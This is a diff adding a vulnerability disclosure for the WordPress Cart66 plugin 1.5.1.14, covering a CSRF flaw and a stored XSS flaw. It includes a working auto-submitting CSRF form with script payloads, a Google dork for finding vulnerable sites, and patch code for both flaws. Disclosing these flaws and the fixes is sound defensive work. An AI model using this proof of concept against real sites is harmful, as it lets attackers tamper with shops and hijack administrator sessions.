@@ -1,0 +1,145 @@
+# Exploit Title:     Wordpress Cart66 Plugin 1.5.1.14 Multiple Vulnerabilities
+# Exploit Author:    absane
+# Blog:              http://blog.noobroot.com
+# Discovery date:    September 29th 2013
+# Vendor notified:   September 29th 2013
+# Vendor fixed:      October 2 2013
+# Vendor Homepage:   http://cart66.com
+# Software Link:     http://downloads.wordpress.org/plugin/cart66-lite.1.5.1.14.zip
+# Tested on:         Wordpress 3.6.1
+# Google-dork:       inurl:/wp-content/plugins/cart66
+# CVE (CSRF):        CVE-2013-5977
+# CVE (XSS):         CVE-2013-5978
+
+Two vulnerabilities were discovered in the Wordpress plugin Cart66 version 1.5.1.14.
+
+Vulnerabilities:
+1) CSRF
+2) XSS (Stored)
+
+
+VULNERABILITY #1
+************
+*** CSRF ***
+************
+Page affected: http://[victim_site]/wordpress/wp-admin/admin.php?page=cart66-products
+
+If the Wordpress admin were logged in and clicked on a link hosting code similar to the one in the PoC, then the admin may unknowingly add a product to his site or have an existing product altered. Other possibilities include, but are not limited to, injecting code into a field vulnerable to stored XSS (see the second vulnerability).
+
+================
+Proof of Concept
+================
+Host this code on a remote wesbserver different from the Wordpress site that uses Cart66. As an authenticated Wordpress admin user visit the page and add what you will to the fields. A new product is added. In a live attack, the fields will be hidden, prefilled, and some javascript code will auto submit the fields.
+
+
+<html><body>
+<form name="csrf_form" action="http://192.168.196.135/wordpress/wp-admin/admin.php?page=cart66-products" method="post" enctype="multipart/form-data" id="products-form">
+<input type="hidden" name="cart66-action" value="save product" />
+<input type="hidden" name="product[id]" value="" />
+<input class="long" type="hidden" name='product[name]' id='product-name' value='<script>alert("pwned")</script>' />
+<input type='hidden' name='product[item_number]' id='product-item_number' value='1337' />
+<input type='hidden' id="product-price" name='product[price]' value='13.37' />
+<input type='hidden' id="product-price_description" name='product[price_description]' value='<script>alert(";)")</script>' />
+<input type='hidden' id="product-is_user_price" name='product[is_user_price]' value='0' />
+<input type="hidden" id="product-min_price" name='product[min_price]' value='' />
+<input type="hidden" id="product-max_price" name='product[max_price]' value='' /> 
+<input type='hidden' id="product-taxable" name='product[taxable]' value='0'>
+<input type='hidden' id="product-shipped" name='product[shipped]' value='1'>
+<input type="hidden" id="product-weight" name="product[weight]" value=""  />
+<input type="hidden" id="product-min_qty" name='product[min_quantity]' value='' />
+<input type="hidden" id="product-max_qty" name='product[max_quantity]' value='' />
+<script type="text/javascript">document.csrf_form.submit();</script>
+</body></html>
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+VULNERABILITY #2
+*******************
+*** Stored XSS  ***
+*******************
+Page affected: http://[victim_site]/wordpress/wp-admin/admin.php?page=cart66-products in the following input fields:
+* Product name
+* Price description
+
+================
+Proof of Concept
+================
+In the vulnerable fields add <script>alert(0)</script> 
+
+The product name XSS vuln is particiularly dangerous because an attacker can use the CSRF vulnerability to add a product whose name is a malicious script. All the admin user needs to do is view the product to be attacked.
+
+]....................................[
+]..............SOLUTIONS.............[
+]....................................[
+
+Grab the latest update! Or... 
+
+XSS
+----
+In products.php, replace the line:
+$product->setData($_POST['product']);
+
+with:
+$product->setData(Cart66Common::postVal('product'));
+
+CSRF
+----
+In products.php, replace the following:
+
+<form action="admin.php?page=cart66-products" method="post" enctype="multipart/form-data" id="products-form">
+  <input type="hidden" name="cart66-action" value="save product" />
+  <input type="hidden" name="product[id]" value="<?php echo $product->id ?>" />
+  <div id="widgets-left" style="margin-right: 50px;">
+    <div id="available-widgets">
+
+with:
+
+<form action="admin.php?page=cart66-products" method="post" enctype="multipart/form-data" id="products-form">
+  <input type="hidden" name="cart66_product_nonce" value="<?php echo wp_create_nonce('cart66_product_nonce'); ?>" />
+  <input type="hidden" name="cart66-action" value="save product" />
+  <input type="hidden" name="product[id]" value="<?php echo $product->id ?>" />
+  <div id="widgets-left" style="margin-right: 50px;">
+    <div id="available-widgets">
+
+And, in Cart66Product.php replace the validate() function with:
+
+  public function validate() {
+    $errors = array();
+    
+    if(!wp_verify_nonce($_POST['cart66_product_nonce'], 'cart66_product_nonce')) {
+      $errors['nonce'] = __("An unkown error occured, please try again later","cart66");
+    }
+    else {
+      // Verify that the item number is present
+      if(empty($this->item_number)) {
+        $errors['item_number'] = __("Item number is required","cart66");
+      }
+    
+      if(empty($this->spreedlySubscriptionId))  {
+        $this->spreedlySubscriptionId = 0;
+      }
+    
+      // Verify that no other products have the same item number
+      if(empty($errors)) {
+        $sql = "SELECT count(*) from $this->_tableName where item_number = %s and id != %d";
+        $sql = $this->_db->prepare($sql, $this->item_number, $this->id);
+        $count = $this->_db->get_var($sql);
+        if($count > 0) {
+          $errors['item_number'] = __("The item number must be unique","cart66");
+        }
+      }
+    
+      // Verify that if the product has been saved and there is a download path that there is a file located at the path
+      if(!empty($this->download_path)) {
+        $dir = Cart66Setting::getValue('product_folder');
+        if(!file_exists($dir . DIRECTORY_SEPARATOR . $this->download_path)) {
+          $errors['download_file'] = __("There is no file available at the download path:","cart66") . " " . $this->download_path;
+        }
+      }
+    }
+
+    return $errors;
+  }
